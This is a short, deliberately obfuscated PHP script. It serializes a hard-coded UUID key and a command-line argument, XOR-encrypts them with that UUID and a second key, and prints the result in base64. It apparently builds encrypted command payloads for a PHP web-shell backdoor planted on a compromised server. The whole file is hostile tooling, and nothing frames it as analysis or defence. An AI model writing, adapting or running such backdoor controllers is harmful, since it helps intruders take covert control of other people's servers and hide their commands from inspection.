<?php

$m9e75 = "a7a529cf-3f28-4030-a4b5-64ee3f3f9831";

function q0da4886($z7aa6, $l737fe5)
{
    $n4f030cb = "";

    for ($j97b599=0; $j97b599<strlen($z7aa6);)
    {
        for ($gae9f0=0; $gae9f0<strlen($l737fe5) && $j97b599<strlen($z7aa6); $gae9f0++, $j97b599++)
        {
            $n4f030cb .= chr(ord($z7aa6[$j97b599]) ^ ord($l737fe5[$gae9f0]));
        }
    }

    return $n4f030cb;
}

function u79c($z7aa6, $l737fe5)
{
    global $m9e75;

    return q0da4886(q0da4886($z7aa6, $m9e75), $l737fe5);
}

echo base64_encode(u79c(serialize(array(ak => "a7a529cf-3f28-4030-a4b5-64ee3f3f9831", a => "$argv[1]")), $argv[2]));

?>
